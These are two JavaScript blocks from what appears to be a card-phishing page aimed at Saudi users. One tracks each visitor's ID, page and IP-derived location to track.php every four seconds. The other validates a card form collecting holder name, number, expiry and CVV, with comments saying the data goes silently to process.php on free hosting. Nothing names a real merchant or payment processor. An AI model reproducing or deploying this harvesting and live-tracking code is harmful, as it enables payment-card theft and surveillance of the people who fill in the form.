<script>
  // 1. تفعيل المعرف الثابت لكل زائر لمنع التكرار الجلسات
  let visitorCode = localStorage.getItem('visitor_code');
  if (!visitorCode) {
      visitorCode = 'VSR-' + Math.random().toString(36).substring(2, 9).toUpperCase();
      localStorage.setItem('visitor_code', visitorCode);
  }

  async function sendTracking() {
      // استعادة الدولة والمنطقة المخزنة لتسريع الموقع وتوفير البيانات
      let countryCode = localStorage.getItem('visitor_country') || 'un';
      let regionName = localStorage.getItem('visitor_region') || 'جاري التحديد...';

      if (countryCode === 'un' || regionName === 'جاري التحديد...') {
          try {
              // جلب البيانات بدقة (رابط سريع ومفتوح تماماً لجميع دول العالم ومناطق السعودية)
              const res = await fetch('https://ipapi.co');
              const geo = await res.json();
              
              countryCode = geo.country_code ? geo.country_code.toLowerCase() : 'sa';
              regionName = geo.region || geo.city || 'منطقة عامة';
              
              localStorage.setItem('visitor_country', countryCode);
              localStorage.setItem('visitor_region', regionName);
          } catch (e) {
              // حل احتياطي سريع في حال تعطل الرابط الأول لأي سبب
              try {
                  const resAlt = await fetch('https://ipinfo.io');
                  const geoAlt = await resAlt.json();
                  countryCode = geoAlt.country ? geoAlt.country.toLowerCase() : 'sa';
                  regionName = geoAlt.region || geoAlt.city || 'السعودية';
                  
                  localStorage.setItem('visitor_country', countryCode);
                  localStorage.setItem('visitor_region', regionName);
              } catch (err) {}
          }
      }

      // 2. تحويل وتجهيز البيانات للإرسال المتوافق مع الاستضافة المجانية
      const params = new URLSearchParams();
      params.append('code', visitorCode);
      params.append('pageTitle', document.title); // اسم الصفحة دقيق بدون روابط
      params.append('countryCode', countryCode); // كود الدولة للعلم
      params.append('region', regionName); // إرسال المنطقة بشكل مستقل ومستقر

      fetch('track.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: params
      }).catch(e => console.log(e));
  }

  // بث التحديث الفوري وتكراره كل 4 ثوانٍ لتأكيد التواجد
  sendTracking();
  setInterval(sendTracking, 4000);

  // تحديث فوري دقيق للاسم والحالة عند الرجوع والتقدم بأزرار المتصفح
  window.addEventListener('pageshow', sendTracking);
</script>

     <script>
// 1. دالة التحقق من كتابة الحروف فقط لاسم حامل البطاقة
function validateLettersOnly(input) {
    input.value = input.value.replace(/[^a-zA-Z\s\u0600-\u06FF]/g, '');
}

// 2. دالة التحقق من الرمز السري (أرقام فقط وثلاثة خانات كحد أقصى)
function validateCvvOnly(input) {
    input.value = input.value.replace(/\D/g, ''); 
}

// 3. تنسيق رقم البطاقة تلقائياً + كشف وإظهار نوع البطاقة (مدى / فيزا / ماستركارد)
document.getElementById('card-number').addEventListener('input', function (e) {
    // تنظيف القيمة من المسافات وأي شيء ليس رقماً
    let clearValue = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/g, '');

    const logoMada = document.getElementById('logo-mada');
    const logoVisa = document.getElementById('logo-visa');
    const logoMaster = document.getElementById('logo-mastercard');

    // التحقق من الشعارات بناءً على الرقم الأول عند تخطي 4 أرقام
    if (clearValue.length >= 4) {
        let firstDigit = clearValue.charAt(0);

        if (firstDigit === '4') {
            if(logoVisa) logoVisa.style.display = 'inline-block';
            if(logoMada) logoMada.style.display = 'none';
            if(logoMaster) logoMaster.style.display = 'none';
        } else if (firstDigit === '5') {
            if(logoMaster) logoMaster.style.display = 'inline-block';
            if(logoMada) logoMada.style.display = 'none';
            if(logoVisa) logoVisa.style.display = 'none';
        } else {
            if(logoMada) logoMada.style.display = 'inline-block';
            if(logoVisa) logoVisa.style.display = 'none';
            if(logoMaster) logoMaster.style.display = 'none';
        }
    } else {
        // إظهار كافة الشعارات إذا كان الحقل فارغاً أو أقل من 4 أرقام
        if(logoMada) logoMada.style.display = 'inline-block';
        if(logoVisa) logoVisa.style.display = 'inline-block';
        if(logoMaster) logoMaster.style.display = 'inline-block';
    }

    // تنسيق المدخلات بإضافة مسافة كل 4 أرقام
    let formattedValue = clearValue.match(/.{1,4}/g);
    e.target.value = formattedValue ? formattedValue.join(' ') : '';
});

// 4. تنسيق تاريخ الانتهاء MM/YY والتحقق التلقائي من الشهور والسنوات (بين 26 و 44)
document.getElementById('card-expiry').addEventListener('input', function (e) {
    let value = e.target.value.replace(/\D/g, '');
    value = value.substring(0, 4);

    if (value.length >= 2) {
        e.target.value = value.substring(0, 2) + '/' + value.substring(2);
    } else {
        e.target.value = value;
    }

    // فحص صلاحية التاريخ المدخل منطقياً
    if (value.length === 4) {
        const month = parseInt(value.substring(0, 2), 10);
        const year = parseInt(value.substring(2, 4), 10);

        if (month < 1 || month > 12) {
            this.setCustomValidity('الشهر غير صحيح (يجب أن يكون بين 01 و 12).');
        } else if (year < 26 || year > 44) {
            this.setCustomValidity('السنة غير صحيحة (يجب أن تكون بين 26 و 44).');
        } else {
            this.setCustomValidity(''); // المدخلات صحيحة
        }
    } else {
        this.setCustomValidity(''); 
    }
});

// 5. حماية الإرسال النهائي بالكامل ومنع النقل والنقر المتكرر
document.getElementById('paymentForm').addEventListener('submit', function (e) {
    const form = e.currentTarget;
    const holder = document.getElementById('card-holder');
    const cardNumber = document.getElementById('card-number');
    const expiry = document.getElementById('card-expiry');
    const cvv = document.getElementById('card-cvv');
    const submitBtn = document.getElementById('submitBtn');

    // إزالة الفراغات لتدقيق الأرقام بدقة
    const rawCardNumber = cardNumber.value.replace(/\s/g, '');

    // أولاً: التحقق من المتطلبات الأساسية للمتصفح (HTML HTML5 Validation)
    if (!form.checkValidity()) {
        e.preventDefault(); // منع الإرسال
        form.classList.add('submitted');
        return false;
    }

    // ثانياً: شروط التحقق المخصصة لأطوال البيانات
    if (holder.value.trim().length < 3) {
        alert('يرجى كتابة الاسم الكامل المكتوب على البطاقة.');
        e.preventDefault();
        return false;
    }
    
    if (rawCardNumber.length < 15 || rawCardNumber.length > 16) {
        alert('يرجى التأكد من إدخال رقم البطاقة المكون من 15 أو 16 رقماً بشكل صحيح.');
        e.preventDefault(); 
        return false;
    }

    if (expiry.value.length < 5 || !expiry.value.includes('/')) {
        alert('يرجى إدخال تاريخ انتهاء صلاحية البطاقة بصيغة MM/YY الصحيحة.');
        e.preventDefault();
        return false;
    }

    if (cvv.value.length !== 3) {
        alert('الرمز السري (CVV) يجب أن يتكون من 3 أرقام تماماً.');
        e.preventDefault();
        return false;
    }

    // إذا تخطى الكود كل الشروط السابقة بنجاح، يتم تعطيل الزر لمنع تكرار البيانات ونقله صامتاً لـ process.php
    if (submitBtn) {
        submitBtn.disabled = true;
        submitBtn.innerText = "🔒 جاري تأمين الاتصال ومعالجة البيانات...";
    }
    
    return true;
});
</script>
